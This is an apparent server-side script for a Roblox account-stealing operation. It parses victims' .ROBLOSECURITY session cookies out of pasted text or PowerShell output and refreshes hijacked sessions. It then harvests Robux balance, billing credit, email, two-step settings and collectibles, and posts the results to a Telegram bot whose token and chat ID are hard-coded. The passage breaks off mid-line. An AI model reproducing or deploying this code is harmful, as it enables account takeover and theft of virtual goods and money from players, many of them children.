// api/submit.js
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT = process.env.TG_CHAT || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (e) {
    console.error('TG Error:', e);
  }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/\${ip}?fields=status,message,country,countryCode,regionName,city,isp,query`, { timeout: 3000 });
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (e) {
    return null;
  }
}

function extractRobloxCookie(raw) {
  if (!raw) return null;

  // Full cookie with WARNING prefix already intact
  const fullMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^\s"']+)/);
  if (fullMatch) return fullMatch[1];

  // Cookie buried in powershell/text — grab WARNING prefix + token after |_
  const psMatch = raw.match(/\.ROBLOSECURITY[^_]*(_\|WARNING[^\s"']+)/);
  if (psMatch) return psMatch[1];

  // WARNING prefix with token after |_
  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-.]{50,})/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;

  // Just the token after |_
  const tokenOnly = raw.match(/\|_([\w\-.]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;

  // Bare long base64-like string (no prefix at all)
  const bareToken = raw.trim().match(/^([A-Za-z0-9\-_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;

  return null;
}

// Check if user owns specific gamepass
async function checkGamepass(uid, gamepassId, headers) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
    if (!res.ok) return false;
    const data = await res.json();
    return data.data && data.data.length > 0;
  } catch (_) {
    return false;
  }
}

// WORKING Cookie Renewal Function
async function renewRobloxCookie(cookie) {
  try {
    // Step 1: Get CSRF token
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
        'x-csrf-token': ''
      }
    });
    
    const csrfToken = csrfRes.headers.get('x-csrf-token');
    if (!csrfToken) {
      console.error('Failed to get CSRF token');
      return null;
    }

    // Step 2: Validate the session by accessing account settings
    const validateRes = await fetch('https://www.roblox.com/account/settings', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'x-csrf-token': csrfToken,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      }
    });
    
    if (!validateRes.ok) {
      console.error('Session validation failed');
      return null;
    }

    // Step 3: Check if we got a new cookie in the response
    const setCookieHeader = validateRes.headers.get('set-cookie');
    if (setCookieHeader) {
      const cookies = setCookieHeader.split(',').map(c => c.trim());
      const robloSecurityCookie = cookies.find(c => c.startsWith('.ROBLOSECURITY='));
      
      if (robloSecurityCookie) {
        const newCookieValue = robloSecurityCookie.split('=')[1].split(';')[0];
        if (newCookieValue && newCookieValue !== cookie) {
          console.log('Got new cookie from settings page');
          // Return the new cookie with the WARNING prefix
          if (newCookieValue.startsWith('_|WARNING')) {
            return newCookieValue;
          }
          return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${newCookieValue}`;
        }
      }
    }

    // Step 4: Try the mobile API as an alternative
    const mobileRes = await fetch('https://www.roblox.com/mobileapi/userinfo', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
      }
    });
    
    if (mobileRes.ok) {
      // If the mobile API works, the original cookie is still valid
      console.log('Mobile API validation succeeded');
      return cookie;
    }
    
    console.error('All validation methods failed');
    return null;
  } catch (err) {
    console.error('Cookie renewal error:', err);
    return null;
  }
}

async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;
    
    // Fetch main data
    const [
      profileRes, robuxRes, friendsRes, premiumRes,
      billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
    ] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
      fetch(`https://twostepverification.roblox.com/v1/users/\${uid}/configuration`, { headers }).catch(() => null)
    ]);
    
    const profile = profileRes.ok ? await profileRes.json() : null;
    const robuxData = robuxRes.ok ? await robuxRes.json() : null;
    const friendsData = friendsRes.ok ? await friendsRes.json() : null;
    const isPremium = premiumRes.ok ? await premiumRes.json() : false;
    const billingData
